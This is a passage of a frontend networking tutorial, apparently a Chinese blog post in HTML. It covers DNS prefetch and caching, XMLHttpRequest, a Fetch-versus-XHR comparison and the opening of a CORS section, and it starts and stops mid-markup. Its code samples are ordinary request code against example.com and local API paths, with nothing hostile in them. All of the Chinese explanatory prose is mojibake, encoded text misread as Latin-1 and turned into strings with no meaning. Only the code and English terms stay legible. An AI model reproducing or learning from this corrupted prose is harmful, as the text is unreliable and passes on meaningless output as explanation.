title="DNSé¢„å–ï¼ˆdns-prefetchï¼‰ä¸ç¼“å­˜ä¼˜åŒ–"></a>DNSé¢„å–ï¼ˆdns-prefetchï¼‰ä¸ç¼“å­˜ä¼˜åŒ–</h3><p><strong>DNSé¢„å–ï¼ˆdns-prefetchï¼‰</strong></p><p>å®šä¹‰ï¼šæµè§ˆå™¨æå‰è§£æåç»­é¡µé¢å¯èƒ½è®¿é—®çš„åŸŸåï¼Œå°† DNS æŸ¥è¯¢ä¸é¡µé¢æ¸²æŸ“å¹¶è¡Œæ‰§è¡Œï¼Œå‡å°‘ç”¨æˆ·æ„ŸçŸ¥å»¶è¿Ÿã€‚</p><p>å®ç°æ–¹å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åœ¨HTMLå¤´éƒ¨å£°æ˜éœ€é¢„å–çš„åŸŸå --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//api.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>å·¥ä½œæµç¨‹ï¼š</p><ol><li>æµè§ˆå™¨è§£æ HTML æ—¶å‘ç° dns-prefetch æ ‡ç­¾</li><li>åå°å¯åŠ¨ DNS æŸ¥è¯¢ï¼ˆä¸é˜»å¡é¡µé¢æ¸²æŸ“ï¼‰</li><li>ç»“æœç¼“å­˜è‡³ DNS ç¼“å­˜æ± </li><li>å®é™…è¯·æ±‚èµ„æºæ—¶ç›´æ¥ä½¿ç”¨ç¼“å­˜ IP</li></ol><p>æ€§èƒ½å½±å“ï¼š</p><ul><li>å…¸å‹DNSæŸ¥è¯¢è€—æ—¶ï¼š50-200ms</li><li>é¢„å–åå»¶è¿Ÿï¼šâ‰ˆ0msï¼ˆå‘½ä¸­ç¼“å­˜æ—¶ï¼‰</li><li>é€‚ç”¨åœºæ™¯ï¼š<ul><li>ç¬¬ä¸‰æ–¹èµ„æºï¼ˆCDNã€åˆ†æè„šæœ¬ï¼‰</li><li>å¤šåŸŸåæ¶æ„ä¸‹çš„è·¨åŸŸè¯·æ±‚</li></ul></li></ul><p><strong>DNSç¼“å­˜ä¼˜åŒ–æœºåˆ¶</strong></p><p>ç¼“å­˜å±‚çº§ï¼š</p><table><thead><tr><th align="left">å±‚çº§</th><th align="left">ç¼“å­˜ä½ç½®</th><th align="left">å­˜æ´»æ—¶é—´</th><th align="left">æ§åˆ¶æ–¹å¼</th></tr></thead><tbody><tr><td align="left">æµè§ˆå™¨</td><td align="left">å†…å­˜ç¼“å­˜</td><td align="left">ä¼šè¯çº§ï¼ˆå…³é—­æ ‡ç­¾é¡µå¤±æ•ˆï¼‰</td><td align="left">è‡ªåŠ¨ç®¡ç†</td></tr><tr><td align="left">æ“ä½œç³»ç»Ÿ</td><td align="left">ç³»ç»ŸDNSç¼“å­˜</td><td align="left">éµå¾ªTTLï¼ˆé»˜è®¤åˆ†é’Ÿ~å°æ—¶ï¼‰</td><td align="left">ipconfig &#x2F;flushdns</td></tr><tr><td align="left">æœ¬åœ°DNS</td><td align="left">é€’å½’è§£æå™¨ç¼“å­˜</td><td align="left">ä¸¥æ ¼éµå¾ªTTL</td><td align="left">ISP&#x2F;ç®¡ç†å‘˜é…ç½®</td></tr></tbody></table><p>TTLï¼ˆTime-To-Liveï¼‰æ ¸å¿ƒä½œç”¨ï¼š</p><ul><li>DNSè®°å½•ä¸­è®¾ç½®çš„æœ‰æ•ˆæœŸï¼ˆç§’ï¼‰ï¼š<code>example.com. 300 IN A 192.0.2.1 # TTL=300ç§’</code></li><li>å¹³è¡¡çŸ›ç›¾ï¼š<ul><li>é«˜TTLï¼ˆæ•°å°æ—¶ï¼‰ï¼šå‡å°‘æŸ¥è¯¢æ¬¡æ•°ï¼Œæå‡é€Ÿåº¦</li><li>ä½TTLï¼ˆç§’çº§ï¼‰ï¼šå¿«é€Ÿæ›´æ–°DNSè®°å½•ï¼ˆå¦‚æ•…éšœè½¬ç§»ï¼‰</li></ul></li></ul><p>ç¼“å­˜åˆ·æ–°ç­–ç•¥ï¼š</p><ul><li>å‰ç«¯æ— æ³•ç›´æ¥æ§åˆ¶ï¼Œä½†å¯é€šè¿‡ä»¥ä¸‹æ–¹å¼é—´æ¥ä¼˜åŒ–ï¼š<ul><li>å…³é”®åŸŸåä½¿ç”¨ç¨³å®šIPï¼ˆé¿å…é¢‘ç¹å˜æ›´ï¼‰</li><li>è¿ç§»åˆ°HTTP&#x2F;2+å‡å°‘åŸŸååˆ†ç‰‡ï¼ˆé™ä½DNSæŸ¥è¯¢éœ€æ±‚ï¼‰</li></ul></li></ul><p><strong>è”åˆä¼˜åŒ–å®è·µ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- æ­¥éª¤1: é¢„å–å…³é”®åŸŸå --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//static.example.com&quot;&gt;<br><br>&lt;!-- æ­¥éª¤2: é¢„è¿æ¥ï¼ˆDNS+TCP+TLSä¸‰åˆä¸€ä¼˜åŒ–ï¼‰ --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;//api.example.com&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><blockquote><p>preconnectï¼šæå‰å®ŒæˆDNS+TCPæ¡æ‰‹+TLSåå•†ï¼ˆèŠ‚çœ3-4æ¬¡RTTï¼‰</p></blockquote><h1 id="äºŒã€ç½‘ç»œè¯·æ±‚æŠ€æœ¯"><a href="#äºŒã€ç½‘ç»œè¯·æ±‚æŠ€æœ¯" class="headerlink" title="äºŒã€ç½‘ç»œè¯·æ±‚æŠ€æœ¯"></a>äºŒã€ç½‘ç»œè¯·æ±‚æŠ€æœ¯</h1><h2 id="2-1-è¯·æ±‚å¤„ç†"><a href="#2-1-è¯·æ±‚å¤„ç†" class="headerlink" title="2.1 è¯·æ±‚å¤„ç†"></a>2.1 è¯·æ±‚å¤„ç†</h2><h3 id="AJAXåŸç†ä¸XMLHttpRequestå¯¹è±¡"><a href="#AJAXåŸç†ä¸XMLHttpRequestå¯¹è±¡" class="headerlink" title="AJAXåŸç†ä¸XMLHttpRequestå¯¹è±¡"></a>AJAXåŸç†ä¸XMLHttpRequestå¯¹è±¡</h3><p><strong>AJAX æ ¸å¿ƒåŸç†</strong></p><p>å®šä¹‰ï¼šAsynchronous JavaScript and XMLï¼ˆå¼‚æ­¥JavaScriptå’ŒXMLï¼‰ï¼Œé€šè¿‡æµè§ˆå™¨å†…ç½®å¯¹è±¡åœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®å¹¶æ›´æ–°éƒ¨åˆ†ç½‘é¡µå†…å®¹ã€‚</p><p>å·¥ä½œæµç¨‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant User    participant Browser    participant Server    User->>Browser: è§¦å‘äº‹ä»¶ï¼ˆç‚¹å‡»/æ»šåŠ¨ç­‰ï¼‰    Browser->>Server: å‘é€å¼‚æ­¥è¯·æ±‚ï¼ˆXHRå¯¹è±¡ï¼‰    Server->>Browser: è¿”å›æ•°æ®ï¼ˆJSON/XML/Textï¼‰    Browser->>Browser: è§£ææ•°æ® -> æ›´æ–°DOM    Browser-->>User: å±€éƒ¨åˆ·æ–°é¡µé¢</pre><p>å…³é”®ç‰¹æ€§ï¼š</p><ul><li>å¼‚æ­¥é€šä¿¡ï¼šä¸é˜»å¡ç”¨æˆ·ç•Œé¢ï¼ˆå¯¹æ¯”ä¼ ç»Ÿè¡¨å•æäº¤ï¼‰</li><li>æ•°æ®æ ¼å¼ï¼šç°ä»£åº”ç”¨ä¸»è¦ç”¨JSONæ›¿ä»£XML</li><li>åŒæºç­–ç•¥ï¼šé»˜è®¤åªèƒ½è¯·æ±‚ç›¸åŒåè®®&#x2F;åŸŸå&#x2F;ç«¯å£çš„èµ„æºï¼ˆå¯é€šè¿‡CORSè§£é™¤ï¼‰</li></ul><p><strong>XMLHttpRequestï¼ˆXHRï¼‰å¯¹è±¡è¯¦è§£</strong></p><p>åˆ›å»ºä¸åˆå§‹åŒ–ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();  <span class="hljs-comment">// åˆ›å»ºå®ä¾‹</span><br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// åˆå§‹åŒ–ï¼ˆæ–¹æ³•, URL, å¼‚æ­¥ï¼‰</span><br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒæ–¹æ³•ï¼š</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">.open(method, url, async)</td><td align="left">é…ç½®è¯·æ±‚ç±»å‹ã€åœ°å€ã€å¼‚æ­¥æ ‡å¿—</td></tr><tr><td align="left">.send([body])</td><td align="left">å‘é€è¯·æ±‚ï¼ˆå¯é€‰è¯·æ±‚ä½“å¦‚JSONï¼‰</td></tr><tr><td align="left">.setRequestHeader(name, value)</td><td align="left">è®¾ç½®è¯·æ±‚å¤´ï¼ˆå¦‚Content-Typeï¼‰</td></tr><tr><td align="left">.abort()</td><td align="left">ç»ˆæ­¢è¯·æ±‚</td></tr></tbody></table><p>å…³é”®å±æ€§ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">.readyState</td><td align="left">è¯·æ±‚çŠ¶æ€ï¼ˆ0-4ï¼‰</td></tr><tr><td align="left">.status</td><td align="left">HTTPçŠ¶æ€ç ï¼ˆå¦‚200, 404ï¼‰</td></tr><tr><td align="left">.responseText</td><td align="left">æ–‡æœ¬å“åº”æ•°æ®</td></tr><tr><td align="left">.responseXML</td><td align="left">XMLæ ¼å¼å“åº”ï¼ˆå·²æ·˜æ±°ï¼‰</td></tr><tr><td align="left">.responseType</td><td align="left">æŒ‡å®šå“åº”æ ¼å¼ï¼ˆå¦‚jsonï¼‰</td></tr></tbody></table><p>äº‹ä»¶ç›‘å¬ï¼ˆå¼‚æ­¥å¤„ç†ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>  &#125;<br>&#125;;<br><span class="hljs-comment">// æˆ–ä½¿ç”¨ç°ä»£äº‹ä»¶ç›‘å¬</span><br>xhr.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// æˆåŠŸå¤„ç†</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>Ajax æŠ€æœ¯æ¼”è¿›ï¼š</p><table><thead><tr><th align="left">æŠ€æœ¯é˜¶æ®µ</th><th align="left">å…¸å‹å®ç°</th><th align="left">ç¼ºé™·</th></tr></thead><tbody><tr><td align="left">åŸç”ŸXHR</td><td align="left">new XMLHttpRequest()</td><td align="left">å›è°ƒåœ°ç‹±ã€ç¹çé”™è¯¯å¤„ç†</td></tr><tr><td align="left">jQueryAJAX</td><td align="left">$.ajax({ â€¦ })</td><td align="left">ä¾èµ–jQueryåº“</td></tr><tr><td align="left">Fetch API</td><td align="left">fetch(url).then(â€¦)</td><td align="left">æ›´ç®€æ´çš„Promiseæ–¹æ¡ˆ</td></tr></tbody></table><p><strong>å‰ç«¯å¼€å‘å…³é”®ç‚¹</strong></p><p>ï¼ˆ1ï¼‰é”™è¯¯å¤„ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* ç½‘ç»œé”™è¯¯å¤„ç† */</span> &#125;;<br>xhr.<span class="hljs-property">ontimeout</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* è¶…æ—¶å¤„ç† */</span> &#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰Content-Type è®¾ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è·¨åŸŸè¯·æ±‚</p><ul><li>éœ€æœåŠ¡å™¨è®¾ç½®Access-Control-Allow-Origin</li><li>å¯é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘</li></ul><h3 id="Fetch-APIåŠä¸XHRå¯¹æ¯”"><a href="#Fetch-APIåŠä¸XHRå¯¹æ¯”" class="headerlink" title="Fetch APIåŠä¸XHRå¯¹æ¯”"></a>Fetch APIåŠä¸XHRå¯¹æ¯”</h3><p><strong>Fetch API æ ¸å¿ƒåŸç†</strong></p><p>å®šä¹‰ï¼šåŸºäº Promise çš„ç°ä»£ç½‘ç»œè¯·æ±‚æ¥å£ï¼Œæ›¿ä»£ä¼ ç»Ÿ XMLHttpRequestï¼ˆXHRï¼‰ï¼Œæä¾›æ›´ç®€æ´ã€å¼ºå¤§çš„è¯·æ±‚å¤„ç†èƒ½åŠ›ã€‚</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, options)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// è§£æJSONå“åº”</span><br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">Promise é©±åŠ¨</td><td align="left">é“¾å¼è°ƒç”¨æ›¿ä»£å›è°ƒåµŒå¥—ï¼Œæ”¯æŒ async&#x2F;await</td></tr><tr><td align="left">æµå¼æ•°æ®å¤„ç†</td><td align="left">å“åº”ä½“å¯åˆ†æ®µè¯»å–ï¼ˆresponse.bodyï¼‰ï¼Œæ”¯æŒå¤§æ–‡ä»¶å¤„ç†</td></tr><tr><td align="left">é»˜è®¤ä¸æºå¸¦Cookie</td><td align="left">éœ€æ˜¾å¼è®¾ç½® credentials: â€˜includeâ€™</td></tr><tr><td align="left">æ›´çµæ´»çš„é…ç½®</td><td align="left">é€šè¿‡ init å¯¹è±¡é…ç½®æ‰€æœ‰å‚æ•°</td></tr><tr><td align="left">å†…ç½®å“åº”ç±»å‹</td><td align="left">æ”¯æŒ response.json()&#x2F;.text()&#x2F;.blob()&#x2F;.arrayBuffer() ç­‰è½¬æ¢æ–¹æ³•</td></tr></tbody></table><p>å®Œæ•´é…ç½®é¡¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,          <span class="hljs-comment">// GET/POST/PUT/DELETE</span><br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer token&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data), <span class="hljs-comment">// æ”¯æŒå¤šç§æ•°æ®ç±»å‹</span><br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,   <span class="hljs-comment">// æºå¸¦Cookie</span><br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,             <span class="hljs-comment">// è·¨åŸŸæ¨¡å¼</span><br>  <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,        <span class="hljs-comment">// ç¼“å­˜æ§åˆ¶</span><br>  <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;follow&#x27;</span>        <span class="hljs-comment">// é‡å®šå‘ç­–ç•¥</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Fetch API ä¸ XHR å…³é”®å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Fetch API</th><th align="left">XMLHttpRequest (XHR)</th></tr></thead><tbody><tr><td align="left">è®¾è®¡ç†å¿µ</td><td align="left">Promise é©±åŠ¨çš„ç°ä»£åŒ– API</td><td align="left">åŸºäºäº‹ä»¶çš„æ—§å¼ API</td></tr><tr><td align="left">è¯­æ³•å¤æ‚åº¦</td><td align="left">ç®€æ´ï¼ˆé“¾å¼è°ƒç”¨ï¼‰</td><td align="left">å†—é•¿ï¼ˆäº‹ä»¶ç›‘å¬ + çŠ¶æ€æ£€æŸ¥ï¼‰</td></tr><tr><td align="left">é”™è¯¯å¤„ç†</td><td align="left">åªå¯¹ç½‘ç»œé”™è¯¯ rejectï¼ˆHTTP 404&#x2F;500 éœ€æ‰‹åŠ¨å¤„ç†ï¼‰</td><td align="left">é€šè¿‡ status æ£€æµ‹æ‰€æœ‰é”™è¯¯</td></tr><tr><td align="left">è¶…æ—¶æ§åˆ¶</td><td align="left">éœ€ç»“åˆ AbortController å®ç°</td><td align="left">åŸç”Ÿæ”¯æŒ timeout å±æ€§</td></tr><tr><td align="left">è¿›åº¦è¿½è¸ª</td><td align="left">æ— åŸç”Ÿè¿›åº¦äº‹ä»¶</td><td align="left">æ”¯æŒ progress äº‹ä»¶ï¼ˆä¸Šä¼ &#x2F;ä¸‹è½½ï¼‰</td></tr><tr><td align="left">è¯·æ±‚å–æ¶ˆ</td><td align="left">é€šè¿‡ AbortController.abort()</td><td align="left">åŸç”Ÿ xhr.abort()</td></tr><tr><td align="left">Cookie ç­–ç•¥</td><td align="left">é»˜è®¤ä¸å‘é€ï¼ˆæ›´å®‰å…¨ï¼‰</td><td align="left">é»˜è®¤å‘é€ï¼ˆéœ€æ‰‹åŠ¨ç¦æ­¢ï¼‰</td></tr><tr><td align="left">å“åº”ç±»å‹å¤„ç†</td><td align="left">é€šè¿‡æ–¹æ³•è½¬æ¢ï¼ˆå¦‚ .json()ï¼‰</td><td align="left">é€šè¿‡å±æ€§è®¿é—®ï¼ˆå¦‚ responseTextï¼‰</td></tr><tr><td align="left">è·¨åŸŸè¯·æ±‚</td><td align="left">é»˜è®¤éµå¾ª CORS</td><td align="left">åŒæ ·éµå¾ª CORS</td></tr></tbody></table><p><strong>å…¸å‹åœºæ™¯ä»£ç å¯¹æ¯”</strong></p><p>ï¼ˆ1ï¼‰GET è¯·æ±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data));<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰POST è¯·æ±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/submit&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;)<br>&#125;);<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/api/submit&#x27;</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰é”™è¯¯å¤„ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch (éœ€æ‰‹åŠ¨å¤„ç†HTTPé”™è¯¯)</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">400</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;API error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();<br>  &#125;);<br><br><span class="hljs-comment">// XHR (ç›´æ¥æ£€æµ‹status)</span><br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// æˆåŠŸ</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å¤„ç†é”™è¯¯</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µå»ºè®®</strong></p><ul><li>ä¼˜å…ˆä½¿ç”¨ Fetchï¼šç°ä»£é¡¹ç›®é¦–é€‰ï¼ˆæµè§ˆå™¨æ”¯æŒç‡ &gt; 98%ï¼‰ï¼Œé…åˆ async&#x2F;await æå‡å¯è¯»æ€§ï¼š</li><li>XHR é€‚ç”¨åœºæ™¯ï¼š<ul><li>éœ€è¦ä¸Šä¼ &#x2F;ä¸‹è½½è¿›åº¦æ¡ï¼ˆxhr.upload.onprogressï¼‰</li><li>å…¼å®¹ IE11 ç­‰è€æ—§æµè§ˆå™¨</li></ul></li><li>è¡¥å……å·¥å…·ï¼š<ul><li>è¶…æ—¶å¤„ç†å’Œä¸­æ–­è¯·æ±‚ï¼š</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">5000</span>);<br><span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆCORSæœºåˆ¶-JSONP-ä»£ç†æœåŠ¡å™¨ï¼‰"><a href="#è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆCORSæœºåˆ¶-JSONP-ä»£ç†æœåŠ¡å™¨ï¼‰" class="headerlink" title="è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆCORSæœºåˆ¶&#x2F;JSONP&#x2F;ä»£ç†æœåŠ¡å™¨ï¼‰"></a>è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆCORSæœºåˆ¶&#x2F;JSONP&#x2F;ä»£ç†æœåŠ¡å™¨ï¼‰</h3><p><strong>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</strong></p><p>æ ¸å¿ƒåŸç†ï¼š</p><p>æµè§ˆå™¨é€šè¿‡ HTTPå¤´éƒ¨åå•† å†³å®šæ˜¯å¦å…è®¸è·¨åŸŸè¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å£°æ˜å“ªäº›å¤–éƒ¨åŸŸå¯è®¿é—®èµ„æºã€‚</p><p>å…³é”®æµç¨‹ï¼š</p><ul><li>ç®€å•è¯·æ±‚ï¼ˆSimple Requestï¼‰ï¼š<ul><li>æ¡ä»¶ï¼šGET&#x2F;HEAD&#x2F;POST + 